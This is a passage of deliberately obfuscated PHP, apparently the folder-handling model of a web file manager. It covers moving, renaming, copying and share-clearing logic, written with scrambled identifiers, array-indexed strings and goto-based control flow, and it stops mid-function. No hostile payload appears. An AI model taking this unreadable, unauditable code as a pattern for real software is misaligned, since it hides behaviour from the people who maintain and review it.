($d¶ÏÛó¯ä½ as $c’¼Ñ‚Î‡) { $bÖ¯ëŠ¡°¿ = $c’¼Ñ‚Î‡[$fòä¹ÇØÈƒ[390]]; $C¢íê‰á’á = $this->_childrenMatch($CÃğ°ÃÑ½‹, $c’¼Ñ‚Î‡, $BôáÇí¿Õø); $AØê—Õè[] = array($fòä¹ÇØÈƒ[390], $bÖ¯ëŠ¡°¿, $fòä¹ÇØÈƒ[472], $C¢íê‰á’á[$fòä¹ÇØÈƒ[472]]); $D¬Ñ¸ÒÌŠ[] = array($fòä¹ÇØÈƒ[390], $bÖ¯ëŠ¡°¿, $fòä¹ÇØÈƒ[481], $C¢íê‰á’á[$fòä¹ÇØÈƒ[481]]); $this->_copyApplyMeta($c’¼Ñ‚Î‡, $fğ†õƒÒ…’); if ($c’¼Ñ‚Î‡[$fòä¹ÇØÈƒ[397]] != $fòä¹ÇØÈƒ[86]) { $fğ†õƒÒ…’[$fòä¹ÇØÈƒ[524]][] = $c’¼Ñ‚Î‡[$fòä¹ÇØÈƒ[441]]; } } $this->chunkEventSet($fòä¹ÇØÈƒ[536], array($fòä¹ÇØÈƒ[537], $d¯¼†”Êø, $B¹÷ºÒÁÕ·)); $this->saveAll($AØê—Õè); goto a ³—ø»ÌÈ; C¡Ô›Ğãé¶: $CÃğ°ÃÑ½‹[$fŞ½„õ„£’] = $AÒ¢ÛºŒà¬; $AØê—Õè = array(); $D¬Ñ¸ÒÌŠ = array(); goto FƒØƒ§ò; a©³Õİ‹é½: $this->addAll($BÌ¼ÂÕŠÅğ, array(), !1); $d¶ÏÛó¯ä½ = $this->where(array($fòä¹ÇØÈƒ[472] => $AÒ¢ÛºŒà¬))->select(); $CÃğ°ÃÑ½‹ = $this->_childrenMakeRelation($B¨ª¬ß‡, $d¶ÏÛó¯ä½); goto C¡Ô›Ğãé¶; BêÅ˜‹¥›: if ($aéÉé©Úù˜[$fòä¹ÇØÈƒ[397]] != $fòä¹ÇØÈƒ[86]) { $fğ†õƒÒ…’[$fòä¹ÇØÈƒ[524]][] = $aéÉé©Úù˜[$fòä¹ÇØÈƒ[441]]; return $AÒ¢ÛºŒà¬; } $B¨ª¬ß‡ = array(); $BÌ¼ÂÕŠÅğ = array(); goto a¯êöİµö£; e¹¤‹ğéãº: $d¯¼†”Êø = $this->_makeItemData($aéÉé©Úù˜, $D²…õí¼–, $EƒÇ¿Ë˜ñÃ); Hook::trigger($fòä¹ÇØÈƒ[531], $d¯¼†”Êø); Hook::trigger($fòä¹ÇØÈƒ[532], array($fòä¹ÇØÈƒ[533], $d¯¼†”Êø, 0)); goto fŠÁâÉ½Ş; a ³—ø»ÌÈ: $this->chunkEventSet($fòä¹ÇØÈƒ[538], array($fòä¹ÇØÈƒ[539], $d¯¼†”Êø, $B¹÷ºÒÁÕ·)); $this->saveAll($D¬Ñ¸ÒÌŠ); return $AÒ¢ÛºŒà¬; goto DÖ‹·Ô¾ùŒ; DÖ‹·Ô¾ùŒ: } private function _childrenMakeRelation($cí½Ğ—İÈÅ, $fÉ³ÒŒ´§) { $aãš…††¨ç =& $_SERVER[Â€Á›¨õ]; $AìŒè³ë = array(); $b˜ÏØè–à¶ = array(); foreach ($cí½Ğ—İÈÅ as $DŒÛğ£É˜) { $AÚ†âŸƒÍ = $DŒÛğ£É˜[$aãš…††¨ç[28]] . $aãš…††¨ç[8] . $DŒÛğ£É˜[$aãš…††¨ç[481]]; $AìŒè³ë[$AÚ†âŸƒÍ] = $DŒÛğ£É˜[$aãš…††¨ç[390]]; } foreach ($fÉ³ÒŒ´§ as $DŒÛğ£É˜) { $AÚ†âŸƒÍ = $DŒÛğ£É˜[$aãš…††¨ç[28]] . $aãš…††¨ç[8] . $DŒÛğ£É˜[$aãš…††¨ç[481]]; $d”Ë›ÄÎŠ¦ = $AìŒè³ë[$AÚ†âŸƒÍ]; $b˜ÏØè–à¶[$d”Ë›ÄÎŠ¦] = $DŒÛğ£É˜[$aãš…††¨ç[390]]; } return $b˜ÏØè–à¶; } private function _childrenMatch($a§ğÄéí†, $B–ÆŒšæ¤, $A £®¶éî) { goto FÓ ÙÎ©…; FÓ ÙÎ©…: $c©†Œ¯£Ú =& $_SERVER[Â€Á›¨õ]; $BùÍ…¨†öğ = $A £®¶éî[$c©†Œ¯£Ú[481]]; $Bé…Êò•Ş® = $this->parentLevelArray($B–ÆŒšæ¤[$c©†Œ¯£Ú[481]]); goto cÏ¥…®ƒŒÇ; cÏ¥…®ƒŒÇ: foreach ($Bé…Êò•Ş® as $Cõ‡÷ÄÌ†î) { if (isset($a§ğÄéí†[$Cõ‡÷ÄÌ†î])) { $BùÍ…¨†öğ .= $a§ğÄéí†[$Cõ‡÷ÄÌ†î] . $c©†Œ¯£Ú[540]; } } $BùÍ…¨†öğ = rtrim($BùÍ…¨†öğ, $c©†Œ¯£Ú[47]) . $c©†Œ¯£Ú[47]; $cÀ”£˜Á„À = $this->parentLevelArray($BùÍ…¨†öğ); goto d²»³ùÇ¹¶; d²»³ùÇ¹¶: $A˜ª„Ÿ¹¡ñ = $cÀ”£˜Á„À[count($cÀ”£˜Á„À) - 1]; return array($c©†Œ¯£Ú[472] => $A˜ª„Ÿ¹¡ñ, $c©†Œ¯£Ú[481] => $BùÍ…¨†öğ); goto E¢æáÓ£¨; E¢æáÓ£¨: } private function _makeItemData($F»ïˆÓğÇ, $CñËÂ½±¼ƒ, $A›òšµùÔ‰) { $fÅõ“¼æÛ =& $_SERVER[Â€Á›¨õ]; $c‘İ³éÁ… = array($fÅõ“¼æÛ[541] => $F»ïˆÓğÇ[$fÅõ“¼æÛ[397]], $fÅõ“¼æÛ[407] => $A›òšµùÔ‰, $fÅõ“¼æÛ[542] => $F»ïˆÓğÇ[$fÅõ“¼æÛ[399]], $fÅõ“¼æÛ[442] => $F»ïˆÓğÇ[$fÅõ“¼æÛ[441]], $fÅõ“¼æÛ[543] => $F»ïˆÓğÇ[$fÅõ“¼æÛ[77]], $fÅõ“¼æÛ[544] => $CñËÂ½±¼ƒ[$fÅõ“¼æÛ[398]], $fÅõ“¼æÛ[545] => $CñËÂ½±¼ƒ[$fÅõ“¼æÛ[478]], $fÅõ“¼æÛ[546] => USER_ID, $fÅõ“¼æÛ[547] => USER_ID, $fÅõ“¼æÛ[389] => $CñËÂ½±¼ƒ[$fÅõ“¼æÛ[390]], $fÅõ“¼æÛ[548] => $CñËÂ½±¼ƒ[$fÅõ“¼æÛ[481]] . $CñËÂ½±¼ƒ[$fÅõ“¼æÛ[390]] . $fÅõ“¼æÛ[47], $fÅõ“¼æÛ[416] => 0, $fÅõ“¼æÛ[549] => $fÅõ“¼æÛ[33]); return $c‘İ³éÁ…; } private function _copyApplyMeta($fçá¢¦†, &$d†Ô¢á‚’”) { $FĞ•Î”øÂÏ =& $_SERVER[Â€Á›¨õ]; $eÍÖ¬õ“Ñí = $fçá¢¦†[$FĞ•Î”øÂÏ[390]]; $A™ê£Î¢ÈÔ = $fçá¢¦†[$FĞ•Î”øÂÏ[28]]; if (!isset($fçá¢¦†[$FĞ•Î”øÂÏ[550]]) || !$fçá¢¦†[$FĞ•Î”øÂÏ[550]] || $fçá¢¦†[$FĞ•Î”øÂÏ[550]] == $FĞ•Î”øÂÏ[491]) { $d†Ô¢á‚’”[$FĞ•Î”øÂÏ[526]][] = array($FĞ•Î”øÂÏ[390], $eÍÖ¬õ“Ñí, $FĞ•Î”øÂÏ[550], short_id($eÍÖ¬õ“Ñí)); } if (Input::check($A™ê£Î¢ÈÔ, $FĞ•Î”øÂÏ[551])) { $d†Ô¢á‚’”[$FĞ•Î”øÂÏ[525]][] = array($FĞ•Î”øÂÏ[390] => $eÍÖ¬õ“Ñí, $FĞ•Î”øÂÏ[92] => $FĞ•Î”øÂÏ[438], $FĞ•Î”øÂÏ[370] => str_replace($FĞ•Î”øÂÏ[50], $FĞ•Î”øÂÏ[33], Pinyin::encode($A™ê£Î¢ÈÔ))); $d†Ô¢á‚’”[$FĞ•Î”øÂÏ[525]][] = array($FĞ•Î”øÂÏ[390] => $eÍÖ¬õ“Ñí, $FĞ•Î”øÂÏ[92] => $FĞ•Î”øÂÏ[437], $FĞ•Î”øÂÏ[370] => Pinyin::encode($A™ê£Î¢ÈÔ, $FĞ•Î”øÂÏ[552])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($fÎ’èÚäó) { goto EÁ£â³ÏÀ¼; e¯‰İ…Éâ: $B³¨³«—Ä = array_to_keyvalue($B³¨³«—Ä, $f©­¤ŞÅÎ[390]); foreach ($B³¨³«—Ä as $Bö‰„ ÑµÑ) { $b¬¬é´·² = $Bö‰„ ÑµÑ[$f©­¤ŞÅÎ[472]]; $fÎ’èÚäó = $Bö‰„ ÑµÑ[$f©­¤ŞÅÎ[390]]; if (!isset($this->_childrenListCache[$fÎ’èÚäó]) && $Bö‰„ ÑµÑ[$f©­¤ŞÅÎ[397]] == $f©­¤ŞÅÎ[86]) { $this->_childrenListCache[$fÎ’èÚäó] = array(); } if (!isset($this->_childrenListCache[$b¬¬é´·²])) { $this->_childrenListCache[$b¬¬é´·²] = array(); } $this->_childrenListCache[$b¬¬é´·²][$fÎ’èÚäó] = $Bö‰„ ÑµÑ; $this->_childrenItemCache[$fÎ’èÚäó] = $Bö‰„ ÑµÑ; } goto Dğ°ëÂ¦¼ˆ; EÁ£â³ÏÀ¼: $f©­¤ŞÅÎ =& $_SERVER[Â€Á›¨õ]; $cºÔãïøÕã = $this->sourceInfo($fÎ’èÚäó); $Fä¥¦ÕØ¹ = $f©­¤ŞÅÎ[418]; goto føÂ‚œò™; føÂ‚œò™: $f…š‡Ø–¿ = array($f©­¤ŞÅÎ[481] => array($f©­¤ŞÅÎ[507], $cºÔãïøÕã[$f©­¤ŞÅÎ[481]] . $fÎ’èÚäó . $f©­¤ŞÅÎ[508]), $f©­¤ŞÅÎ[417] => $this->targetIsDelete); $B³¨³«—Ä = $this->field($Fä¥¦ÕØ¹)->where($f…š‡Ø–¿)->select(); if (!$B³¨³«—Ä) { return; } goto e¯‰İ…Éâ; Dğ°ëÂ¦¼ˆ: } private function _childrenListAll($eÌ–¤Ÿ‘’ˆ, &$B¶Ô¸ƒçêÓ) { $föÁ‘ó±ƒ =& $_SERVER[Â€Á›¨õ]; if (!isset($this->_childrenListCache[$eÌ–¤Ÿ‘’ˆ])) { return; } $e—«‚‹‚â¶ = $this->_childrenListCache[$eÌ–¤Ÿ‘’ˆ]; foreach ($e—«‚‹‚â¶ as $FÖ»Š¯†¡… => $e§œ“œº«) { $B¶Ô¸ƒçêÓ[$FÖ»Š¯†¡…] = $e§œ“œº«; if ($e§œ“œº«[$föÁ‘ó±ƒ[397]] == $föÁ‘ó±ƒ[86]) { $this->_childrenListAll($FÖ»Š¯†¡…, $B¶Ô¸ƒçêÓ); } } } private function sourceInfoCache($F‡”·ª§) { if (isset($this->_childrenItemCache[$F‡”·ª§])) { return $this->_childrenItemCache[$F‡”·ª§]; } return $this->sourceInfo($F‡”·ª§); } private function _childrenList($cŸè’¶µš») { if (isset($this->_childrenListCache[$cŸè’¶µš»])) { return $this->_childrenListCache[$cŸè’¶µš»]; } return $this->_childrenListSelect($cŸè’¶µš»); } private function _childrenListSelect($AĞã›ç«Î˜) { goto bÂõ—‘›Ëµ; bÂõ—‘›Ëµ: $EÚÊˆ•ºéŠ =& $_SERVER[Â€Á›¨õ]; $f×ù³ØßˆÛ = array($EÚÊˆ•ºéŠ[472] => $AĞã›ç«Î˜, $EÚÊˆ•ºéŠ[417] => $this->targetIsDelete); $BòœòÄŒâ = $this->where($f×ù³ØßˆÛ)->select(); goto Aëò²Á¾ÆÜ; B½“ö…Â¼ç: foreach ($EÖµ†ƒÁŒö as $AĞã›ç«Î˜ => $BÚ§ëôŸÉ™) { $this->_childrenItemCache[$AĞã›ç«Î˜] = $BÚ§ëôŸÉ™; } return $EÖµ†ƒÁŒö; goto A¡‹æø¾”ë; Aëò²Á¾ÆÜ: $BòœòÄŒâ = $BòœòÄŒâ ? $BòœòÄŒâ : array(); $EÖµ†ƒÁŒö = array_to_keyvalue($BòœòÄŒâ, $EÚÊˆ•ºéŠ[390]); $this->_childrenListCache[$AĞã›ç«Î˜] = $EÖµ†ƒÁŒö; goto B½“ö…Â¼ç; A¡‹æø¾”ë: } private function fileNameExistCache($Fò›¤§‘, $FñÏÀÊ½Ú‰) { $FÃÉÆÍ¼Ù¯ =& $_SERVER[Â€Á›¨õ]; $FñÏÀÊ½Ú‰ = strtolower($FñÏÀÊ½Ú‰); $DÈÊ˜‘Òƒ = $this->_childrenList($Fò›¤§‘); foreach ($DÈÊ˜‘Òƒ as $e¬ƒ‘ÈÏ·Õ) { if ($FñÏÀÊ½Ú‰ == strtolower($e¬ƒ‘ÈÏ·Õ[$FÃÉÆÍ¼Ù¯[28]])) { return $e¬ƒ‘ÈÏ·Õ[$FÃÉÆÍ¼Ù¯[390]]; } } return !1; } private function fileNameAutoCache($DœÌî—ê«, $C­Ö¢¤ÅÕ’, $FÅ¨Ÿè¸ƒ½, $D•…ŒòÅ¾Ó) { $f„¢¾‘ñ² =& $_SERVER[Â€Á›¨õ]; $Fñˆ†×Öäë = $this->_childrenList($DœÌî—ê«); $d™ÃáË¡Î = array_to_keyvalue($Fñˆ†×Öäë, $f„¢¾‘ñ²[33], $f„¢¾‘ñ²[28]); return $this->fileNameAutoGet($d™ÃáË¡Î, $C­Ö¢¤ÅÕ’, $FÅ¨Ÿè¸ƒ½, $D•…ŒòÅ¾Ó); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($F•›´à·ÅÀ, $B®Ğ…£‘Œ, $b…—³ìœœ½ = REPEAT_REPLACE, $CÍ©‚ÄË‚ = '') { goto C»Ä†—˜”; A‚ÕÌÅãœÖ: $this->lockWriteStart($B®Ğ…£‘Œ, $d¥¹ñ¢´“Œ); $CÄ†š…×Âí = array($bğ°²¥ˆÊœ[524] => array(), $bğ°²¥ˆÊœ[555] => !1); $this->clearShare($F•›´à·ÅÀ, $B®Ğ…£‘Œ); goto eñÊĞ¢äã¡; bÕ†àÏ¤¿›: if ($D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[397]] == $bğ°²¥ˆÊœ[86] && $d¸˜‹½Ş¡©) { $this->folderSizeResetChildren($DœŒèÚßçá); } Model($bğ°²¥ˆÊœ[173])->linkAdd($CÄ†š…×Âí[$bğ°²¥ˆÊœ[524]]); if ($d¸˜‹½Ş¡© && $CÄ†š…×Âí[$bğ°²¥ˆÊœ[555]]) { $this->removeNow($F•›´à·ÅÀ, !1); } goto EÃè­¬Ü; fŞè„ßæëÌ: if ($D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[472]] == $B²ªÄ ÓÉ[$bğ°²¥ˆÊœ[390]]) { if ($D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[417]] == $bğ°²¥ˆÊœ[86]) { Model($bğ°²¥ˆÊœ[415])->restore(array($F•›´à·ÅÀ)); } if (!$CÍ©‚ÄË‚ || $CÍ©‚ÄË‚ == $D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[28]]) { return $F•›´à·ÅÀ; } } $bõæ“¬±– = $this->pathInfoMore($F•›´à·ÅÀ); if ($this->isParentOf($F•›´à·ÅÀ, $B®Ğ…£‘Œ)) { return !1; } goto dÌ¨é÷ß½¢; EÃè­¬Ü: $this->lockMoveEnd($F•›´à·ÅÀ); $this->lockWriteEnd($B®Ğ…£‘Œ, $d¥¹ñ¢´“Œ); $this->folderSizeReset($D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[472]]); goto BØÓ´—Ù; eñÊĞ¢äã¡: $d¸˜‹½Ş¡© = $this->fileNameExistCache($B®Ğ…£‘Œ, $D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[28]]); $DœŒèÚßçá = $this->_move($F•›´à·ÅÀ, $B®Ğ…£‘Œ, $b…—³ìœœ½, $CÄ†š…×Âí, $CÍ©‚ÄË‚); $this->sourceCacheClear(); goto bÕ†àÏ¤¿›; BØÓ´—Ù: $this->folderSizeReset($B®Ğ…£‘Œ); $cê¨µÜ…† = array($D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[472]], $B®Ğ…£‘Œ); if ($D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[397]] == $bğ°²¥ˆÊœ[86]) { $cê¨µÜ…†[] = $F•›´à·ÅÀ; } goto DÚ˜†Ô¤Šò; C¿¸Ë¥†í–: return $DœŒèÚßçá; goto E“†ãâ±½ğ; DÚ˜†Ô¤Šò: $this->updateModifyTime($cê¨µÜ…†); Model($bğ°²¥ˆÊœ[528])->eventMove($F•›´à·ÅÀ, $D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[472]], $B®Ğ…£‘Œ); Hook::trigger($bğ°²¥ˆÊœ[554], $bõæ“¬±–); goto C¿¸Ë¥†í–; C»Ä†—˜”: $bğ°²¥ˆÊœ =& $_SERVER[Â€Á›¨õ]; $D¾Ë‚¨Â˜ö = $this->sourceInfo($F•›´à·ÅÀ); $B²ªÄ ÓÉ = $this->sourceInfo($B®Ğ…£‘Œ); goto fŞè„ßæëÌ; dÌ¨é÷ß½¢: if (!$D¾Ë‚¨Â˜ö || !$B²ªÄ ÓÉ || $B²ªÄ ÓÉ[$bğ°²¥ˆÊœ[397]] != $bğ°²¥ˆÊœ[86]) { return !1; } Hook::trigger($bğ°²¥ˆÊœ[553], $bõæ“¬±–); $this->targetIsDelete = intval($D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[417]]); goto e¬ÀŞÌÅÄ; e¬ÀŞÌÅÄ: if ($D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[472]] == $B®Ğ…£‘Œ && $CÍ©‚ÄË‚ != $D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[28]]) { $eóì‡Ù†‡ = $this->fileNameExist($B®Ğ…£‘Œ, $CÍ©‚ÄË‚); if ($eóì‡Ù†‡ && $D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[397]] == $bğ°²¥ˆÊœ[491]) { goto aŸ‹Êä°ç; aŸ‹Êä°ç: $Fîä“ì¯Ãï = $this->sourceInfo($eóì‡Ù†‡); $F¬ÒŞˆÚØ = $this->fileHistory($Fîä“ì¯Ãï, $D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[441]], $D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[77]]); if (!$F¬ÒŞˆÚØ) { Model($bğ°²¥ˆÊœ[444])->remove($D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[441]]); } goto eÀÄîÊÊ‹; eÀÄîÊÊ‹: $this->removeNow($F•›´à·ÅÀ, !1); $this->folderSizeReset($B®Ğ…£‘Œ); Hook::trigger($bğ°²¥ˆÊœ[554], $bõæ“¬±–); goto DœğÄÌğù¤; DœğÄÌğù¤: return $eóì‡Ù†‡; goto EŞÌ§‚ç¦À; EŞÌ§‚ç¦À: } } $d¥¹ñ¢´“Œ = $CÍ©‚ÄË‚ ? $CÍ©‚ÄË‚ : $D¾Ë‚¨Â˜ö[$bğ°²¥ˆÊœ[28]]; $this->lockMoveStart($F•›´à·ÅÀ); goto A‚ÕÌÅãœÖ; E“†ãâ±½ğ: } private function _move($Dô²¨…­¥, $b‹ã´åàÎ, $a½°§‚îÈğ, &$EÄÕ‚¤Î, $cªé©¹ŒŒØ = '') { goto A±ã©Îİ; A›©—ÇºÂ’: return $aôİ÷†×ÁÓ; goto f©ºÂÁÒêÌ; dĞøôŒ®Á: $this->lockWriteStart($b‹ã´åàÎ, $AŒİïôÉ¤Ç); if (!$B‘ÓµËöøª) { return $this->_moveForce($Dô²¨…­¥, $b‹ã´åàÎ, $AŒİïôÉ¤Ç); } $aôİ÷†×ÁÓ = $B‘ÓµËöøª; goto C–‰„êÜ«È; C–‰„êÜ«È: $BÈ¶Ì³Œñ¡ = !1; if ($A‡È“ùò¿) { if ($a½°§‚îÈğ == REPEAT_RENAME_FOLDER) { $AŒİïôÉ¤Ç = $this->fileNameAuto($b‹ã´åàÎ, $AŒİïôÉ¤Ç, $a½°§‚îÈğ, $A‡È“ùò¿); $aôİ÷†×ÁÓ = $this->_moveForce($Dô²¨…­¥, $b‹ã´åàÎ, $AŒİïôÉ¤Ç); } else { if ($a½°§‚îÈğ == REPEAT_RENAME_FOLDER) { $a½°§‚îÈğ = REPEAT_RENAME; } $E”‡†¦æ¼ = $this->_childrenListSelect($Dô²¨…­¥); foreach ($E”‡†¦æ¼ as $e£¢š¾‡ŸÙ) { $this->_move($e£¢š¾‡ŸÙ[$CÉÛ¡¶â´[390]], $B‘ÓµËöøª, $a½°§‚îÈğ, $EÄÕ‚¤Î); } $BÈ¶Ì³Œñ¡ = !0; } } else { if ($a½°§‚îÈğ == REPEAT_SKIP) { $BÈ¶Ì³Œñ¡ = !0; } else { if ($a½°§‚îÈğ == REPEAT_RENAME || $a½°§‚îÈğ == REPEAT_RENAME_FOLDER) { $AŒİïôÉ¤Ç = $this->fileNameAuto($b‹ã´åàÎ, $AŒİïôÉ¤Ç, $a½°§‚îÈğ, $A‡È“ùò¿); $aôİ÷†×ÁÓ = $this->_moveForce($Dô²¨…­¥, $b‹ã´åàÎ, $AŒİïôÉ¤Ç); } else { if ($a½°§‚îÈğ == REPEAT_REPLACE) { $f«Ñ—æ©† = $this->sourceInfoCache($B‘ÓµËöøª); $aõ „â ì = $this->fileHistory($f«Ñ—æ©†, $b‚çŸ¨£©®[$CÉÛ¡¶â´[441]], $b‚çŸ¨£©®[$CÉÛ¡¶â´[77]]); if ($aõ „â ì) { $EÄÕ‚¤Î[$CÉÛ¡¶â´[524]][] = $b‚çŸ¨£©®[$CÉÛ¡¶â´[441]]; } else { $BÈ¶Ì³Œñ¡ = !0; } } } } } if ($BÈ¶Ì³Œñ¡ && !$EÄÕ‚¤Î[$CÉÛ¡¶â´[555]]) { $EÄÕ‚¤Î[$CÉÛ¡¶â´[555]] = !0; } goto A›©—ÇºÂ’; A±ã©Îİ: $CÉÛ¡¶â´ =& $_SERVER[Â€Á›¨õ]; $b‚çŸ¨£©® = $this->sourceInfo($Dô²¨…­¥); $A‡È“ùò¿ = $b‚çŸ¨£©®[$CÉÛ¡¶â´[397]] == $CÉÛ¡¶â´[86]; goto Bà¼œêÕ; Bà¼œêÕ: $AŒİïôÉ¤Ç = $cªé©¹ŒŒØ ? $cªé©¹ŒŒØ : $b‚çŸ¨£©®[$CÉÛ¡¶â´[28]]; $B‘ÓµËöøª = $this->fileNameExistCache($b‹ã´åàÎ, $AŒİïôÉ¤Ç); $this->lockMoveStart($Dô²¨…­¥); goto dĞøôŒ®Á; f©ºÂÁÒêÌ: } private function _moveForce($bìÚÚ¨Ô¢Ï, $bÕ§ò†¼“», $c“–Ù¨Œ‚Ş) { goto DêÓù¢ï¶; DêÓù¢ï¶: $EŸ‰µÄÖ½ =& $_SERVER[Â€Á›¨õ]; $cŒÅÄÁ†ÔÑ = $this->sourceInfo($bìÚÚ¨Ô¢Ï); $bÃŒŞÌÍÅ• = $this->sourceInfo($bÕ§ò†¼“»); goto B‡ˆ£ÀçÜ™; D‚®ßğÑİİ: if ($d÷Ÿ‰ŞÑ) { $eš±ùÏ‰¤ = array($EŸ‰µÄÖ½[548] => array($EŸ‰µÄÖ½[507], $cŒÅÄÁ†ÔÑ[$EŸ‰µÄÖ½[481]] . $cŒÅÄÁ†ÔÑ[$EŸ‰µÄÖ½[390]] . $EŸ‰µÄÖ½[508])); $a‘¤ìÓÜÑÅ = $cŒÅÄÁ†ÔÑ[$EŸ‰µÄÖ½[481]] . $cŒÅÄÁ†ÔÑ[$EŸ‰µÄÖ½[390]] . $EŸ‰µÄÖ½[47]; $aëãÚ—ÁŸ = $bÃŒŞÌÍÅ•[$EŸ‰µÄÖ½[481]] . $bÃŒŞÌÍÅ•[$EŸ‰µÄÖ½[390]] . $EŸ‰µÄÖ½[47] . $cŒÅÄÁ†ÔÑ[$EŸ‰µÄÖ½[390]] . $EŸ‰µÄÖ½[47]; $f°ºšğÔ¾Í = array($EŸ‰µÄÖ½[548] => array($EŸ‰µÄÖ½[556], "\x72\145\x70\x6c\141\143\x65\x28\160\x61\162\x65\156\x74\x4c\145\166\x65\x6c\54\x27{$a‘¤ìÓÜÑÅ}\47\x2c\47{$aëãÚ—ÁŸ}\x27\x29"), $EŸ‰µÄÖ½[544] => $bÃŒŞÌÍÅ•[$EŸ‰µÄÖ½[398]], $EŸ‰µÄÖ½[545] => $bÃŒŞÌÍÅ•[$EŸ‰µÄÖ½[478]]); if ($Eµ†ã«À¶—) { $f°ºšğÔ¾Í[$EŸ‰µÄÖ½[416]] = 0; } $this->where($eš±ùÏ‰¤)->data($f°ºšğÔ¾Í)->save(); } $this->where(array($EŸ‰µÄÖ½[404] => $bìÚÚ¨Ô¢Ï))->data($F÷¢Ò‚âÂ)->save(); return $bìÚÚ¨Ô¢Ï; goto EÄø„…Æ¹—; B‡ˆ£ÀçÜ™: $d÷Ÿ‰ŞÑ = $cŒÅÄÁ†ÔÑ[$EŸ‰µÄÖ½[397]] == $EŸ‰µÄÖ½[86]; $F÷¢Ò‚âÂ = array($EŸ‰µÄÖ½[389] => $bÃŒŞÌÍÅ•[$EŸ‰µÄÖ½[390]], $EŸ‰µÄÖ½[548] => $bÃŒŞÌÍÅ•[$EŸ‰µÄÖ½[481]] . $bÃŒŞÌÍÅ•[$EŸ‰µÄÖ½[390]] . $EŸ‰µÄÖ½[47], $EŸ‰µÄÖ½[544] => $bÃŒŞÌÍÅ•[$EŸ‰µÄÖ½[398]], $EŸ‰µÄÖ½[545] => $bÃŒŞÌÍÅ•[$EŸ‰µÄÖ½[478]], $EŸ‰µÄÖ½[547] => USER_ID, $EŸ‰µÄÖ½[407] => $c“–Ù¨Œ‚Ş); $Bİˆù—— = $cŒÅÄÁ†ÔÑ[$EŸ‰µÄÖ½[398]] == SourceModel::TYPE_GROUP && $bÃŒŞÌÍÅ•[$EŸ‰µÄÖ½[398]] == SourceModel::TYPE_GROUP && $cŒÅÄÁ†ÔÑ[$EŸ‰µÄÖ½[478]] == $bÃŒŞÌÍÅ•[$EŸ‰µÄÖ½[478]]; goto Aï÷ƒ«Ÿ÷Æ; Aï÷ƒ«Ÿ÷Æ: if (!$Bİˆù—— && $this->moveClearAuth) { Model($EŸ‰µÄÖ½[476])->authClear($bìÚÚ¨Ô¢Ï); } $Eµ†ã«À¶— = $cŒÅÄÁ†ÔÑ[$EŸ‰µÄÖ½[417]] == $EŸ‰µÄÖ½[86] && $bÃŒŞÌÍÅ•[$EŸ‰µÄÖ½[417]] != $EŸ‰µÄÖ½[86]; if ($Eµ†ã«À¶—) { $F÷¢Ò‚âÂ[$EŸ‰µÄÖ½[416]] = 0; } goto D‚®ßğÑİİ; EÄø„…Æ¹—: } private function clearShare($DÃ‘Æ¥®½ñ, $CÊŒšš‰«„) { goto B¨²†ï»œÕ; bÃˆ¡ÏêÑŸ: if (!$A Æ‡ôæ¦Ì) { return; } $fÄ¡†¼Üæ = array($cŠ¡àÛ´Ú¢[390] => array($cŠ¡àÛ´Ú¢[7], $A Æ‡ôæ¦Ì), $cŠ¡àÛ´Ú¢[469] => 1); $dšÖ³çÎ‹† = Model($cŠ¡àÛ´Ú¢[558])->field($cŠ¡àÛ´Ú¢[462])->where($fÄ¡†¼Üæ)->select(); goto F¯í†©’É›; cùÊëåËƒ: Model($cŠ¡àÛ´Ú¢[558])->where($fÄ¡†¼Üæ)->save(array($cŠ¡àÛ´Ú¢[469] => 0)); Model($cŠ¡àÛ´Ú¢[559])->where($fÄ¡†¼Üæ)->delete(); goto FÌ¾³Ü÷–ó; B¨²†ï»œÕ: $cŠ¡àÛ´Ú¢ =& $_SERVER[Â€Á›¨õ]; $CÌíÑ§ï¿à = $this->sourceInfo($DÃ‘Æ¥®½ñ); $a”Ï¸Í¿®¯ = $this->sourceInfo($CÊŒšš‰«„); goto fƒùòÇâˆ˜; fƒùòÇâˆ˜: if ($CÌíÑ§ï¿à[$cŠ¡àÛ´Ú¢[478]] == $a”Ï¸Í¿®¯[$cŠ¡àÛ´Ú¢[478]] && $CÌíÑ§ï¿à[$cŠ¡àÛ´Ú¢[398]] == $cŠ¡àÛ´Ú¢[557]) { return; } $fÄ¡†¼Üæ = array($cŠ¡àÛ´Ú¢[481] => array($cŠ¡àÛ´Ú¢[507], $CÌíÑ§ï¿à[$cŠ¡àÛ´Ú¢[481]] . $DÃ‘Æ¥®½ñ . $cŠ¡àÛ´Ú¢[508])); $A Æ‡ôæ¦Ì = $this->field($cŠ¡àÛ´Ú¢[404])->where($fÄ¡†¼Üæ)->getField($cŠ¡àÛ´Ú¢[390], !0); goto bÃˆ¡ÏêÑŸ; F¯í†©’É›: if (!$dšÖ³çÎ‹†) { return; } $dšÖ³çÎ‹† = array_to_keyvalue($dšÖ³çÎ‹†, $cŠ¡àÛ´Ú¢[33], $cŠ¡àÛ´Ú¢[462]); $fÄ¡†¼Üæ = array($cŠ¡àÛ´Ú¢[462] => array($cŠ¡àÛ´Ú¢[7], $dšÖ³çÎ‹†)); goto cùÊëåËƒ; FÌ¾³Ü÷–ó: } public function copyFolderFromIO($CêÈİåøƒ, $F³¯³‹¤Á, $Bà¦Ø‘ÏÚí, $f˜ŞİÖ›µ°, $D¨Á°óÉÇ¿, $c•°Àïîˆ† = false) { goto b™¡Ğ¯Ğ¢ò; fÜšâÖè‰ª: 